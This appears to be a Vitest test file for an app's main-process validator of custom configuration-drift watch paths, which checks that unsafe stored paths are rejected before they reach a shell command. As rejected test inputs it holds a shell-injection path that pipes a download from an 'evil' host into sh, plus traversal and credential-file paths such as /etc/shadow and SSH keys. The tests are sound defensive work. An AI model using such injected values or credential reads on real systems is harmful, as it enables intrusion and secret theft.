import { describe, it, expect, beforeEach } from 'vitest'

import {
  driftWatchesForCollection,
  setDriftWatchesForTests,
  syncDriftWatches
} from '../src/main/services/driftWatchStore'
import { buildDriftCommand, DRIFT_WATCHES } from '../src/shared/drift'

// The MAIN-process copy of the operator's custom drift watches.
//
// Modelled on `accessWriteGate.ts` and for the reason stated there: a
// renderer-side check constrains only an honest renderer. `checkDriftWatch`
// running in a settings dialog is a good dialog; the threat is a blob on disk,
// or a compromised renderer, putting a path into `data:save` that no dialog
// ever saw. The path ends up interpolated into the collector script, so the
// process that runs the script is the one that has to be sure about it.

const blob = (driftWatches: unknown): unknown => ({ settings: { driftWatches } })
const custom = (): string[] =>
  driftWatchesForCollection()
    .filter((w) => !DRIFT_WATCHES.some((c) => c.id === w.id))
    .map((w) => w.path)

beforeEach(() => setDriftWatchesForTests([]))

describe('what main will read', () => {
  it('is the catalogue when nothing was stored', () => {
    syncDriftWatches(blob(undefined))
    expect(driftWatchesForCollection()).toEqual(DRIFT_WATCHES)
  })

  // A settings blob that predates this key, a half-written one, a renderer that
  // never sent one -- every path where we do not know what the operator chose
  // ends with what shipped before this existed.
  it('is the catalogue for a blob of the wrong shape', () => {
    for (const bad of [null, undefined, {}, { settings: null }, blob('not an array'), blob(7)]) {
      syncDriftWatches(bad)
      expect(driftWatchesForCollection()).toEqual(DRIFT_WATCHES)
    }
  })

  it('adds a watch that passes the same check the dialog uses', () => {
    syncDriftWatches(blob([{ path: '/etc/logrotate.conf', label: 'logrotate', comment: '#', rules: ['comments'] }]))
    expect(custom()).toEqual(['/etc/logrotate.conf'])
  })

  it('never lets a custom watch displace a catalogue one', () => {
    syncDriftWatches(blob([{ path: '/etc/logrotate.conf', rules: ['comments'] }]))
    const all = driftWatchesForCollection()
    expect(all.slice(0, DRIFT_WATCHES.length)).toEqual(DRIFT_WATCHES)
  })
})

describe('a stored watch is re-validated here, not trusted', () => {
  // THE point of the file. A blob is not a dialog.
  it('drops a path that could break out of the shell literal', () => {
    syncDriftWatches(blob([{ path: "/etc/x'; curl evil | sh; '", rules: ['comments'] }]))
    expect(custom()).toEqual([])
  })

  it('drops a traversal', () => {
    syncDriftWatches(blob([{ path: '/etc/../root/.ssh/id_rsa', rules: ['comments'] }]))
    expect(custom()).toEqual([])
  })

  it('drops a credential store', () => {
    syncDriftWatches(blob([{ path: '/etc/ssl/private/site.pem', rules: ['comments'] }]))
    expect(custom()).toEqual([])
  })

  it('drops a path outside /etc', () => {
    syncDriftWatches(blob([{ path: '/root/.ssh/authorized_keys', rules: ['comments'] }]))
    expect(custom()).toEqual([])
  })

  // Dropped rather than repaired. There is no safe repair for a path that could
  // break out of a shell literal, and quietly fixing one would mean the file
  // being read is not the file that was approved.
  it('drops the bad entry and keeps the good one', () => {
    syncDriftWatches(
      blob([
        { path: '/etc/fstab', rules: ['comments'] },
        { path: '/etc/shadow', rules: ['comments'] }
      ])
    )
    expect(custom()).toEqual(['/etc/fstab'])
  })

  it('refuses a rules array whose members are not known rules', () => {
    syncDriftWatches(blob([{ path: '/etc/fstab', rules: [{ evil: true }, 42] }]))
    expect(custom()).toEqual([])
  })

  it('survives a rules field that is not an array at all', () => {
    // It arrives by structured clone, where a `string[]` annotation is a claim,
    // and a string here would make the membership test throw rather than
    // refuse.
    expect(() => syncDriftWatches(blob([{ path: '/etc/fstab', rules: 'comments' }]))).not.toThrow()
    expect(custom()).toEqual([])
  })

  it('drops an entry that is not an object at all', () => {
    syncDriftWatches(blob(['/etc/fstab', null, 7]))
    expect(custom()).toEqual([])
  })

  it('does not let one path in twice', () => {
    // Two watches with one id would make a reading ambiguous.
    syncDriftWatches(
      blob([
        { path: '/etc/fstab', rules: ['comments'] },
        { path: '/etc/fstab', label: 'again', rules: ['comments'] }
      ])
    )
    expect(custom()).toEqual(['/etc/fstab'])
  })

  it('does not let a blob assert a watch that shadows a catalogue path', () => {
    const first = DRIFT_WATCHES[0]
    syncDriftWatches(blob([{ path: first.path, label: 'mine', rules: ['comments'] }]))
    expect(custom()).toEqual([])
  })
})

describe('what the collector is then handed', () => {
  it('builds a command containing only quoted literals', () => {
    syncDriftWatches(blob([{ path: '/etc/logrotate.conf', rules: ['comments'] }]))
    const cmd = buildDriftCommand({ watches: driftWatchesForCollection() })
    expect(cmd).toContain("'/etc/logrotate.conf'")
    // Every literal opened is closed. An odd count means one was left open,
    // which is the injection this whole file exists to prevent.
    expect(cmd.split("'").length % 2).toBe(1)
  })

  it('contains no sudo, whatever was added, when escalation is off', () => {
    syncDriftWatches(blob([{ path: '/etc/fstab', rules: ['comments'] }]))
    expect(
      buildDriftCommand({ watches: driftWatchesForCollection(), sudo: false })
    ).not.toContain('sudo')
  })
})
